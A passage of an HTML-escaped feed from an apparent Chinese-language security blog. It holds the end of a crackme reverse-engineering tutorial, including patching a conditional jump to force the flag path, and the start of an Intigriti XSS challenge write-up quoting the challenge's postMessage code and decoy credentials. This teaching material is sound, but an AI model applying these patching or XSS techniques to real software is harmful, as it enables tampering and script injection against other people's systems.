class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;0&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;         &lt;span class=&quot;token comment&quot;&gt;// 0x30 = &#39;0&#39;&lt;/span&gt;&lt;br&gt;    result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; a &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x3c&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                    &lt;span class=&quot;token comment&quot;&gt;// 0x529+0x3c=0x75 -&gt;&#39;u&#39;&lt;/span&gt;&lt;br&gt;    result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;_&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                         &lt;span class=&quot;token comment&quot;&gt;// 0x5f = &#39;_&#39;&lt;/span&gt;&lt;br&gt;    result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x14&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;            &lt;span class=&quot;token comment&quot;&gt;// 0x75-0x14=0x61 -&gt; &#39;a&#39;&lt;/span&gt;&lt;br&gt;    result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x03&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;            &lt;span class=&quot;token comment&quot;&gt;// 0x61-0x03=0x64 -&gt; &#39;d&#39;&lt;/span&gt;&lt;br&gt;    result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                   &lt;span class=&quot;token comment&quot;&gt;// &#39;d&#39;&lt;/span&gt;&lt;br&gt;    result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x65&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                        &lt;span class=&quot;token comment&quot;&gt;// &#39;e&#39;&lt;/span&gt;&lt;br&gt;    result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                   &lt;span class=&quot;token comment&quot;&gt;// &#39;d&#39;&lt;/span&gt;&lt;br&gt;    result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                   &lt;span class=&quot;token comment&quot;&gt;// &#39;_&#39;&lt;/span&gt;&lt;br&gt;    result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x74&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                       &lt;span class=&quot;token comment&quot;&gt;// &#39;t&#39;&lt;/span&gt;&lt;br&gt;    result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;           &lt;span class=&quot;token comment&quot;&gt;// 0x74-0xc=0x68 -&gt; &#39;h&#39;&lt;/span&gt;&lt;br&gt;    result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x72&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                       &lt;span class=&quot;token comment&quot;&gt;// &#39;r&#39;&lt;/span&gt;&lt;br&gt;    result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x33&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                       &lt;span class=&quot;token comment&quot;&gt;// &#39;e&#39;&lt;/span&gt;&lt;br&gt;    result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x33&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                       &lt;span class=&quot;token comment&quot;&gt;// &#39;e&#39;&lt;/span&gt;&lt;br&gt;    result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                  &lt;span class=&quot;token comment&quot;&gt;// &#39;_&#39;&lt;/span&gt;&lt;br&gt;    result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x6e&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                       &lt;span class=&quot;token comment&quot;&gt;// &#39;n&#39;&lt;/span&gt;&lt;br&gt;    result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                  &lt;span class=&quot;token comment&quot;&gt;// &#39;u&#39;&lt;/span&gt;&lt;br&gt;    result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;18&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;           &lt;span class=&quot;token comment&quot;&gt;// 0x6e-0x1=0x6d -&gt; &#39;m&#39;&lt;/span&gt;&lt;br&gt;    result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x73&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                       &lt;span class=&quot;token comment&quot;&gt;// &#39;s&#39;&lt;/span&gt;&lt;br&gt;    result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x21&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                       &lt;span class=&quot;token comment&quot;&gt;// &#39;!&#39;&lt;/span&gt;&lt;br&gt;    result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                         &lt;span class=&quot;token comment&quot;&gt;// &#39;\n&#39;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; result&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;patching&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#patching&quot;&gt;#&lt;/a&gt; Patching&lt;/h3&gt;
&lt;p&gt;最後結束前來講另一個不錯的想法：直接更改判斷式 patch binary 讓印出 flag 的條件成立，這樣就不用管條件啦！&lt;/p&gt;
&lt;p&gt;Patching 的確是一個常見又簡單的方法的方法，這題只要把 &lt;code&gt;main+133&lt;/code&gt; 的 &lt;code&gt;jne 0x400bcc&lt;/code&gt; 改成相反的 &lt;code&gt;je 0x400bcc&lt;/code&gt; 就可以觸發印出 flag 的邏輯。&lt;/p&gt;
&lt;p&gt;我們從 assembly dump 可以看到 &lt;code&gt;jne 0x400bcc&lt;/code&gt; 在 &lt;code&gt;0x400ba3&lt;/code&gt; 的地方。另外，從 ELF header 可以看到程式跑起來會被 load 在 &lt;code&gt;0x400000&lt;/code&gt; 的位置，所以我們在 ELF 中要找的就是 &lt;code&gt;0x400ba3 — 0x400000 = 0xba3&lt;/code&gt; 這個 offset。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/reverse-02/codebase.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;find codebase&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;我們可以用 vim + xxd mode 找到 &lt;code&gt;0xba3&lt;/code&gt; 的位置（記得 little endian 嗎），看到代表 &lt;code&gt;jne&lt;/code&gt; 的 75。再來只要把它編輯成代表 &lt;code&gt;je&lt;/code&gt; 的 74 再存檔，我們就 patch 好了！&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/reverse-02/xxd-patch.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;patch in vim+xxd&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;於是我們很興奮地把它跑起來，為了確定真的有影響『印 flag 的邏輯』還先輸入正確數字並看到確實出現 “nope”。結果… flag 怎麼是個亂七八糟的東西！&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/reverse-02/messed-flag.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;messed up!&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;抱歉啦，出題者為了防止這種解法，加了產生 flag 的 &lt;code&gt;gen()&lt;/code&gt;，所以數字總合如果不是 1337，產出的 flag 也會是不對的！&lt;/p&gt;
&lt;p&gt;（作者 murmur：而且看出邏輯是三數總合應該還比 patch 簡單吧？&lt;/p&gt;
&lt;h2 id=&quot;%E7%B5%90%E8%AA%9E&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B5%90%E8%AA%9E&quot;&gt;#&lt;/a&gt; 結語&lt;/h2&gt;
&lt;p&gt;恭喜大家成功 reverse 了第一隻小程式，看懂邏輯的剎那有沒有覺得成就感爆棚呢！雖然這是邏輯非常直觀的題目，不過練習判斷程式中『哪裡是重要邏輯』是成為逆向大師的關鍵第一步！&lt;/p&gt;
&lt;p&gt;作為進階一點的挑戰，你可以試試自己寫一隻 hello world 小程式，看看 compile 成不同架構跟處理器後再 disassemble 有何不同喔！&lt;/p&gt;
&lt;h4 id=&quot;%E5%82%99%E8%A8%BB%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%82%99%E8%A8%BB%EF%BC%9A&quot;&gt;#&lt;/a&gt; 備註：&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;lea&lt;/code&gt; 和 &lt;code&gt;mov&lt;/code&gt; 有何不同？更精確一些，下面這兩種有何不同？&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;LEA rax, [RBP+5] ; Compute address of valueMOV rax, [RBP+5] ; Load value at that address&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;lea&lt;/code&gt; 代表 load effective address，裝到暫存器的是『指到目標記憶體的 pointer』，常用於記憶體位置運算。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mov&lt;/code&gt; 代表 load value，裝到暫存器的是『目標記憶體內的值』，常用於值的運算與傳遞。&lt;/p&gt;

		</content>
	</entry>
	
	<entry>
		<title>Intigriti 七月份 XSS 挑戰：突破層層關卡</title>
		<link href="https://tech-blog.cymetrics.io/posts/huli/learn-from-intigriti-xss-0721/"/>
		<updated>2021-08-05T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/huli/learn-from-intigriti-xss-0721/</id>
		<content type="html">
		  &lt;h2 id=&quot;%E5%89%8D%E8%A8%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%89%8D%E8%A8%80&quot;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;!-- summary --&gt;
&lt;!-- 從一題 XSS 的題目中突破層層關卡，學習各種前端相關知識 --&gt;
&lt;!-- summary --&gt;
&lt;p&gt;&lt;a href=&quot;https://www.intigriti.com/&quot;&gt;Intigriti&lt;/a&gt; 這個網站每個月都會有 XSS 挑戰，給你一週的時間去解一道 XSS 的題目，目標是成功執行 &lt;code&gt;alert(document.domain)&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;身為一個前端資安混血工程師，我每個月都有參加（但不一定有解出來），底下是前幾個月的筆記：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.huli.tw/2021/05/25/xss-challenge-by-intigriti-writeup/&quot;&gt;解題心得：Intigriti&#39;s 0421 XSS challenge（上）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.huli.tw/2021/06/07/xss-challenge-by-intigriti-writeup-may/&quot;&gt;Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.huli.tw/2021/07/03/xss-challenge-intigriti-june-review/&quot;&gt;Intigriti 六月份 XSS 挑戰檢討&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;每個月的挑戰都相當有趣，我覺得難易度也掌握得不錯，沒有到超級無敵難，但也不會輕易到一下就被解開。而這個月的挑戰我也覺得很好玩，因此在解開之後寫了這篇心得跟大家分享，期待有越來越多人可以一起參與。&lt;/p&gt;
&lt;p&gt;挑戰網址：&lt;a href=&quot;https://challenge-0721.intigriti.io/&quot;&gt;https://challenge-0721.intigriti.io/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;%E5%88%86%E6%9E%90%E9%A1%8C%E7%9B%AE&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%88%86%E6%9E%90%E9%A1%8C%E7%9B%AE&quot;&gt;#&lt;/a&gt; 分析題目&lt;/h2&gt;
&lt;p&gt;仔細看一下會發現這次的挑戰其實比較複雜一點，因為有三個頁面跟一堆的 &lt;code&gt;postMessage&lt;/code&gt; 還有 &lt;code&gt;onmessage&lt;/code&gt;，要搞清楚他們的關係需要一些時間。&lt;/p&gt;
&lt;p&gt;我看了一下之後因為懶得搞懂，所以決定從反方向開始解。如果是 XSS 題目，代表一定要有地方可以執行程式碼，通常都是 &lt;code&gt;eval&lt;/code&gt; 或是 &lt;code&gt;innerHTML&lt;/code&gt;，所以可以先找到這邊，再往回推該如何抵達。&lt;/p&gt;
&lt;p&gt;接下來就來簡單看一下那三個頁面：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;index.html&lt;/li&gt;
&lt;li&gt;htmledit.php&lt;/li&gt;
&lt;li&gt;console.php&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;index.html&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#index.html&quot;&gt;#&lt;/a&gt; index.html&lt;/h3&gt;
&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;card-container&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt; &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;card-header-small&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Your payloads:&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt; &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;card-content&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;span class=&quot;token language-javascript&quot;&gt;&lt;br&gt;       &lt;span class=&quot;token comment&quot;&gt;// redirect all htmledit messages to the console&lt;/span&gt;&lt;br&gt;       &lt;span class=&quot;token function-variable function&quot;&gt;onmessage&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token parameter&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;          &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;fromIframe&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;             frames&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;cmd&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;log&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;message&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;fromIframe&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;*&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;          &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;       &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;       &lt;span class=&quot;token comment&quot;&gt;/*&lt;br&gt;       var DEV = true;&lt;br&gt;       var store = {&lt;br&gt;           users: {&lt;br&gt;             admin: {&lt;br&gt;                username: &#39;inti&#39;,&lt;br&gt;                password: &#39;griti&#39;&lt;br&gt;             }, moderator: {&lt;br&gt;                username: &#39;root&#39;,&lt;br&gt;                password: &#39;toor&#39;&lt;br&gt;             }, manager: {&lt;br&gt;                username: &#39;andrew&#39;,&lt;br&gt;                password: &#39;hunter2&#39;&lt;br&gt;             },&lt;br&gt;          }&lt;br&gt;       }&lt;br&gt;       */&lt;/span&gt;&lt;br&gt;    &lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;editor&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;       &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;span&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;bin&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;          &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;a&lt;/span&gt; &lt;span class=&quot;token special-attr&quot;&gt;&lt;span class=&quot;token attr-name&quot;&gt;onclick&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token value javascript language-javascript&quot;&gt;frames&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;cmd&lt;span 